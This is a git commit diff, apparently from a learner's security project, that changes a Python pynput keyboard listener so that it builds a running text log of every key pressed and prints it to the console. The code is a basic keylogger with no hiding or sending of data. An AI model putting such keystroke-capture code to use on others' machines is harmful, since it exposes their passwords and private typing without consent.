29a279352a1461389499f6bcdc0b8059ccfc0bdc
A45hw1n <aashwinsharma.ctf@gmail.com>
2024-04-22 07:22:15 -0400

    Bypassing special keys, for readability

--- main.py
+++ main.py
@@ -2,10 +2,25 @@
 import pynput.keyboard
 
 
-def process_key_press(key):
-        print(key)
+log = ""
 
+def process_key_press(key):
+	global log
+	try:
+		log = log + str(key.char)
+	except AttributeError:
+		if key == key.space:
+			log = log + " "
+			# print(log)
+		elif key == key.tab:
+			log = log + "Tab "
+		elif key== key.enter:
+			log = log + "enter "
+		else:
+			log =  log + str(key)
+	print(log)
+		
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
-        keyboard_listener.join()
+	keyboard_listener.join()
 
